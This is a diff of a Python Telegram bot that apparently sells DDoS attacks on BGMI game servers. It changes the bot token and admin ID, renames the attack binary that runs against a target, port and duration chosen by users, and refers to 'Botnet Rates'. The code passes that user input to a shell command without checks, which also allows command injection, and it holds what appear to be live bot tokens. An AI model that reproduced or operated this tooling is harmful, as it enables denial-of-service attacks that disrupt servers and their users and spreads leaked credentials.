@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7774369692:AAGmwq2k62L9h8Sae9P5PToyu7sYXc07s9I')
+bot = telebot.TeleBot('7675494292:AAHIn8nvXwPD2Mbroq13Rd9qwJoml3ks27Y')
 
 # Admin user IDs
-admin_id = {"7941184624"}
+admin_id = {"5666606072"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -204,7 +204,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
+    response = f"🚀 {username} 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃🚀\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -238,7 +238,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./soulcracks {target} {port} {time}"
+                full_command = f"./tom {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -274,10 +274,10 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
-💥 /rules : Please Check Before Use !!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
+🤖 /bgmi : Method For Bgmi Servers. 
+💌 /rules : Please Check Before Use !!.
+🚀 /mylogs : To Check Your Recents Attacks.
+🔥 /plan : Checkout Our Botnet Rates.
 
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
